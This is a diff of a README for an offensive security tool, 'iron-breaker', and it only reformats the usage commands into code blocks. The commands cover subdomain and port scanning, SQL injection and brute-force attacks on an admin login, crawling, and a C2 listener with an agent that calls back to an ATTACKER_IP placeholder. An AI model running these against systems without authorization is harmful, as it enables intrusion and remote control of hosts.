@@ -32,30 +32,38 @@ The binary will be available in target/release/iron-breaker.
 1. Intelligence Scan (Subdomains + AI)
 Scans subdomains and uses AI to suggest exploits.
 
-Bash
+```bash
 ./iron-breaker scan <TARGET> --groq-key <KEY> --concurrency 100
+```
 2. Deep Port Scan
-Bash
+```bash
 ./iron-breaker ports <TARGET_IP> --concurrency 200
+```
 3. Web Attacks
 Runs SQLi checks and brute-force attacks.
 
-Bash
+```bash
 ./iron-breaker web <TARGET_URL> --user admin
+```
 4. Spidering
 Crawl a website as a bot.
 
-Bash
+```bash
 ./iron-breaker spider <TARGET_URL>
+```
 5. Command & Control (C2)
 Listener:
 
-Bash
+```bash
 ./iron-breaker listen --port 4444
+```
 Agent:
 
-Bash
+```bash
 ./iron-breaker c2 --ip <ATTACKER_IP> --port 4444
+```
+
 ⚠️ Disclaimer
+
 This tool is for educational purposes and authorized security testing only.
 Do not use this tool on networks without explicit permission. The author denies responsibility for misuse.
